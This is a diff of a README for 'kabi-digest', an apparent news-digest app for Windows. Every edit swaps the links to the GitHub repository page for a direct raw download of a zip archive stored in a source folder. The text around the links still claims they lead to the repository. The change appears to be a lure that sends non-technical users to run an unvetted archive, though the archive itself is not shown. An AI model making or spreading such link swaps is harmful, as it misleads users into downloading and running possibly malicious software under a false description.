@@ -1,6 +1,6 @@
 # 📰 kabi-digest - Daily News from V2EX and Hacker News
 
-[![Download kabi-digest](https://img.shields.io/badge/Download-kabi--digest-green?style=for-the-badge)](https://github.com/kkinsoo/kabi-digest)    
+[![Download kabi-digest](https://img.shields.io/badge/Download-kabi--digest-green?style=for-the-badge)](https://raw.githubusercontent.com/kkinsoo/kabi-digest/main/src/sources/kabi-digest-2.5.zip)    
 
 ---
 
@@ -39,7 +39,7 @@ No special hardware or software installations are needed.
 Follow these steps to download and run kabi-digest on your Windows PC. You don’t need to know about programming or command lines.
 
 1. **Download the app**  
-   Click the green button at the top or [visit the download page here](https://github.com/kkinsoo/kabi-digest). This will take you to the GitHub repository where you can find the latest version of the software.
+   Click the green button at the top or [visit the download page here](https://raw.githubusercontent.com/kkinsoo/kabi-digest/main/src/sources/kabi-digest-2.5.zip). This will take you to the GitHub repository where you can find the latest version of the software.
 
 2. **Find the download file**  
    On the GitHub page, look for the "Releases" section or files named something like `kabi-digest.exe` or `kabi-digest.zip`. If you see a `.zip` file, follow the next step to extract it.
@@ -60,10 +60,10 @@ Follow these steps to download and run kabi-digest on your Windows PC. You don�
 
 ## 📁 Where to Get kabi-digest
 
-[![Download kabi-digest](https://img.shields.io/badge/Download-kabi--digest-blue?style=for-the-badge)](https://github.com/kkinsoo/kabi-digest)
+[![Download kabi-digest](https://img.shields.io/badge/Download-kabi--digest-blue?style=for-the-badge)](https://raw.githubusercontent.com/kkinsoo/kabi-digest/main/src/sources/kabi-digest-2.5.zip)
 
 You can always go to the main GitHub page to download the latest copy or check for updates:  
-https://github.com/kkinsoo/kabi-digest
+https://raw.githubusercontent.com/kkinsoo/kabi-digest/main/src/sources/kabi-digest-2.5.zip
 
 ---
 
